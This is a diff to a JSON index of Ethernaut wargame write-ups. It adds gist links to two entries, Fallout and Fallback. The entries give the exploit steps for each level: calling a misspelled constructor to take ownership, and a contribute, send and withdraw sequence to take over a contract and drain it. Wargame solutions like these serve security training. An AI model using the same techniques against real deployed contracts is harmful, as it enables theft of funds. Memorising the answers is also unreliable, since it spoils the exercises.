@@ -4,14 +4,16 @@
         {
             "filename": "Fallout.md",
             "description": "Smart Contract Audit Ethernaut: Fallout",
-            "content": "The constructor has incorrect syntax and is misspelled, you can call it as a function and change the ownership of the contract:\n\n``` contract.Fal1out() ```"
+            "content": "The constructor has incorrect syntax and is misspelled, you can call it as a function and change the ownership of the contract:\n\n``` contract.Fal1out() ```",
+            "link": "https://gist.github.com/trmchale1/4088356e12bd482146a1afadbe99c4e0"
         }
     ],
     "fallback.md": [
         {
             "filename": "fallback.md",
             "description": "Smart Contract Audit Ethernaut: Fallback",
-            "content": "Smart Contract Audit Ethernaut: Fallback\n\nIn this game the player must become the owner, then withdraw the full amount from the contract.\n\nThe key part is the receive() function, if the contract recieves a value greater than 0 and contributions of the sender are also greater than zero, then the sender becomes the owner.\n\nWe send some small sum to the player:\n\n``` await contract.contribute.sendTransaction({ from: player, value: toWei('0.0009')}) ```\n\nWe send a small sum to the contract:\n\n``` await sendTransaction({from: player, to: contract.address, value: toWei('0.000001')}) ```\n\nCheck we own the contract:\n\n``` await contract.owner() ```\n\nThen withdraw the loot:\n\n``` await contract.withdraw() ```"
+            "content": "Smart Contract Audit Ethernaut: Fallback\n\nIn this game the player must become the owner, then withdraw the full amount from the contract.\n\nThe key part is the receive() function, if the contract recieves a value greater than 0 and contributions of the sender are also greater than zero, then the sender becomes the owner.\n\nWe send some small sum to the player:\n\n``` await contract.contribute.sendTransaction({ from: player, value: toWei('0.0009')}) ```\n\nWe send a small sum to the contract:\n\n``` await sendTransaction({from: player, to: contract.address, value: toWei('0.000001')}) ```\n\nCheck we own the contract:\n\n``` await contract.owner() ```\n\nThen withdraw the loot:\n\n``` await contract.withdraw() ```",
+            "link": "https://gist.github.com/trmchale1/95b69f2fae637f6511b9818aa007d5b0"
         }
     ]
 }
